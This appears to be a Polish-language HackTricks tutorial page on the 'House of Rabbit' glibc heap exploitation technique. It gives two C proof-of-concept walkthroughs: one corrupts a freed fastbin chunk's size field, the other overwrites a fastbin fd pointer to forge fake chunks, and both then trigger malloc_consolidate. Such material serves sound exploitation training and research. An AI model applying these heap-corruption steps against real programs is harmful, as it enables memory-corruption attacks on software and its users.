# House of Rabbit

{{#include ../../banners/hacktricks-training.md}}

### Wymagania

1. **Możliwość modyfikacji wskaźnika fd fast bin lub rozmiaru**: Oznacza to, że możesz zmienić wskaźnik do przodu kawałka w fastbin lub jego rozmiar.
2. **Możliwość wywołania `malloc_consolidate`**: Można to zrobić, przydzielając duży kawałek lub łącząc górny kawałek, co zmusza stertę do konsolidacji kawałków.

### Cele

1. **Utworzenie nakładających się kawałków**: Aby jeden kawałek nakładał się na inny, co pozwala na dalsze manipulacje stertą.
2. **Fałszowanie fałszywych kawałków**: Aby oszukać alokator, aby traktował fałszywy kawałek jako prawdziwy kawałek podczas operacji na stercie.

## Kroki ataku

### POC 1: Zmodyfikuj rozmiar kawałka fast bin

**Cel**: Utworzyć nakładający się kawałek poprzez manipulację rozmiarem kawałka fastbin.

- **Krok 1: Przydziel kawałki**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
Przydzielamy dwa kawałki po 0x40 bajtów każdy. Te kawałki zostaną umieszczone na liście szybkich binów po zwolnieniu.

- **Krok 2: Zwolnij kawałki**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
Zwalniamy oba kawałki, dodając je do listy fastbin.

- **Krok 3: Zmodyfikuj rozmiar kawałka**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
Zmieniamy metadane rozmiaru `chunk1` na 0xa1. To kluczowy krok, aby oszukać alokatora podczas konsolidacji.

- **Krok 4: Wywołaj `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Przydzielenie dużego kawałka wywołuje funkcję `malloc_consolidate`, łącząc małe kawałki w szybkim binie. Manipulowany rozmiar `chunk1` powoduje, że nakłada się na `chunk2`.

Po konsolidacji `chunk1` nakłada się na `chunk2`, co umożliwia dalsze wykorzystanie.

### POC 2: Modyfikacja wskaźnika `fd`

**Cel**: Stworzyć fałszywy kawałek poprzez manipulację wskaźnikiem `fd` w szybkim binie.

- **Krok 1: Przydziel kawałki**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Wyjaśnienie**: Przydzielamy dwa kawałki, jeden mniejszy i jeden większy, aby przygotować stertę dla fałszywego kawałka.

- **Krok 2: Utwórz fałszywy kawałek**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
Pisaliśmy fałszywe metadane chunków do `chunk2`, aby zasymulować mniejsze chunk.

- **Krok 3: Zwolnij `chunk1`**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Wyjaśnienie**: Zwalniamy `chunk1`, dodając go do listy fastbin.

- **Krok 4: Zmodyfikuj `fd` `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Wyjaśnienie**: Zmieniamy wskaźnik forward (`fd`) `chunk1`, aby wskazywał na nasz fałszywy chunk wewnątrz `chunk2`.

- **Krok 5: Wywołaj `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Przydzielenie dużego kawałka ponownie uruchamia `malloc_consolidate`, który przetwarza fałszywy kawałek.

Fałszywy kawałek staje się częścią listy fastbin, co czyni go legalnym kawałkiem do dalszej eksploatacji.

### Podsumowanie

Technika **House of Rabbit** polega na modyfikacji rozmiaru kawałka fast bin w celu stworzenia nakładających się kawałków lub manipulacji wskaźnikiem `fd`, aby stworzyć fałszywe kawałki. Umożliwia to atakującym fałszowanie legalnych kawałków w stercie, co pozwala na różne formy eksploatacji. Zrozumienie i praktykowanie tych kroków poprawi Twoje umiejętności eksploatacji sterty.

{{#include ../../banners/hacktricks-training.md}}
